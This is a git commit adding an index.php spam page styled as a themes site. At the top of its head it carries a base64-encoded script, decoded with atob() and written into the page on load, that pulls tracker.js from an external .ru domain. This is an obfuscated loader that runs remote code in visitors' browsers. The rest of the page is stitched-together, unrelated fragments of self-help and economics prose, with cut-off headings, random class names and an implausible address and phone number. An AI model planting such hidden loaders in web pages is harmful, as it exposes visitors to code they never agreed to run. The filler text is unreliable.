21c56a6bb667fa5eaf3a2f86f0c45343d3b5b863
batjffla <79535528+batjffla@users.noreply.github.com>
2021-02-23 19:48:20 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl96YjRiMjh0ZXJwdm44enRncWoiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Almost everyone who first saw the cards with the young woman saw the young</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="9dn9wc20ndjxmwzu480xlwk">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="oyz8qorm4aqirrv">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Almost everyone who first saw the cards with the young woman saw the young</h1>
+	</section>
+
+
+	<section class="our-work" class="lhu7bbop1ztu1yd9fd">
+		<h3 class="title">If you, being prepared to see a young woman, saw he</h3>
+		<p>When these tendencies to return to old scenarios are manifested against the backdrop of emotional dependence in marriage, the vulnerability of a relationship that puts the spouse at the center becomes apparent.  FACTORS OF PRODUCTION, THEIR INTERACTION AND COMBINATION Factors of production are the resources necessary for the production process.  In order to understand, it is necessary to take into account a different point of view; it takes courage to be understood.  In other words, supply is the willingness and ability of sellers to supply the market with goods and services for sale depending on their price.  Presentation of results.  In this book, I found confirmation of many of my thoughts, I saw that the questions that I carry in myself worry others as well.  These principles are constantly in sight, and the extent to which members of society understand them and how much they are able to conform to them, propels the society either towards survival and stability, or to decay and collapse.  The functions of state bodies are separate areas in the content of their practical activities.  Skill determines how to do it.  When they were shown evidence that their goals had indeed been achieved, bank executives said, “These interns have no experience! They don’t have the same training that would give them the common sense and maturity of judgment that an assistant manager needs! From further conversations with them, we realized that in fact the essence of their statements was completely different: - We went through fire, water and copper pipes, so why should these guys get off so easily? But, of course, they could not express their thoughts in this way and felt that it was more acceptable to blame the newcomers for the lack of "hardening".In addition, for obvious reasons (remember the allocation of $ 750,000 for a six-month program), the HR department was not very enthusiastic.  - If I understand you correctly, do you want your boss to completely change his leadership style, and you yourself do not want to change even your way of presenting views? - In general, yes ...  It seems like I can't keep the promise I made to myself.  However, he began to do more than was expected of him. </p>
+		<hr>
+
+		<ul class="grid" class="n52aa31msqtas9t0xl8tba5">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="9dn9wc20ndjxmwzu480xlwk">
+		<h3 class="title">Remember the people who are around.  The p</h3>
+		<p>Social benefits and services are diverse.  As a result, the participants are unprepared at him and are forced to "shoot offhand".  You look at the world in the context of what you can do for it and for people.  They can lose their temper and yell at the culprit.  - How! This is where our agreement was ...  Maintaining a balance between P and PC makes the use of physical resources much more efficient.  Unfavorable changes in consumer preferences will cause a decrease in demand Given the national characteristics, it is necessary to proceed from the assumption that demand changes insignificantly if the price of a commodity that is an item of daily demand among people living in a given territory rises.  It lies not in the possession of property, but in self-control, in the victory over oneself.  You can compete with last year's achievements.  To love is to do something: to sacrifice something,to give all of oneself, like a mother giving birth to a baby.  Rebellion grows from the heart, not from the mind. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="oyz8qorm4aqirrv" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="lhu7bbop1ztu1yd9fd">
+		<h3 class="title">"Win / Win or Not to Tangle" If both parties do not come to a s</h3>
+		<p>Work means life to you.  Analysis of data information.  Take time to write down the imaginary funeral experiences we talked about at the beginning of this chapter.  Interdependence is expressed by the we paradigm - we can do it; we can interact; we can, by combining our abilities and capabilities, create something more significant together. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="n52aa31msqtas9t0xl8tba5" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="9dn9wc20ndjxmwzu480xlwk">
+		<h3 class="title">If the owner is unable to effectively use his prope</h3>
+		<p>They are based on the data of the financial statements (balance sheet).  The reasons for the emergence of commodity production.  Competition is an essential condition for the development of market structures.  As the children grew older, their musical tastes began to change, and they wanted to be more involved in defining their performance repertoire and choosing costumes.  This work renews ourselves, strengthens our commitment to what we believe in and stand on.  This is the real test of interpersonal leadership.This goes beyond transactional leadership and leads to transformative leadership that changes both the people involved and the relationships.  They can lose their temper and yell at the culprit.  You cannot become principle-oriented without imagining and concentrating on the unique contributions you alone are destined to make.  You must present your point of view as simply and vividly as possible, and describe his position even better than he himself could have done it.  “Doctor,” I began, “when you called the pharmacy, did you mean Jenny was only two months old? - Not! - he exclaimed - I did not know that! It's good that you called back.  He did not look back: he knew that the tide would soon roll in.  This is the most consumer-friendly form of imperfect competition.  The father begged, insisted, persuaded.  Basically, this is a story about how a person worked on himself in order to integrate certain principles and skills within his personality. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="oyz8qorm4aqirrv" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="lhu7bbop1ztu1yd9fd">
+		<h3 class="title">Real money is characterized by stability, </h3>
+		<p>So the three of us sat down at a table and exchanged pleasantries.  Understanding how your essence affects each interdependent interaction will help you direct your efforts consistently and in harmony with the natural laws of development.  To determine the final earnings, the piece rate is multiplied by the number of products produced.  ” You could call personal mission statements your personal constitution.  And I'm sure anyone reading it will understand why the admiration that I and other people have for the ideas inherent in it. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="n52aa31msqtas9t0xl8tba5" class="title">First, it narrows the vision, as planning for each day often mi</h3>	
+		<p>Everything I did for several months was crossed out.  - Let's define additional goals and criteria for their achievement.  Part four.  And there are negative consequences when we ignore them.  Love-feeling can be returned by love-action.  Our attitudes and our behavior flow from such assumptions.  " One afternoon I was sitting at home in my office writing, in particular, on the topic of patience.  - You'd better call him! - asked Sandra.  The “Lose / Win” position is worse than the “Win ​​/ Lose” position because it has no criteria - no requirements, no expectations, no idea of ​​the future.  You listen to a person's behavior.  A partnership is an activitybased on the pooling of shares (in the form of money or property) of the participants in the enterprise.  It is equal to the product of the book value of fixed assets by the depreciation rate. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="9dn9wc20ndjxmwzu480xlwk">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="oyz8qorm4aqirrv"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="lhu7bbop1ztu1yd9fd"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="n52aa31msqtas9t0xl8tba5"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>72101 Abbott Extension, Suite 310, 25048, Schadenstad, New Jersey, United States</p>
+		<p>Phone number: +9150568793520352</p>
+	</footer>
+
+</body>
+
+</html>
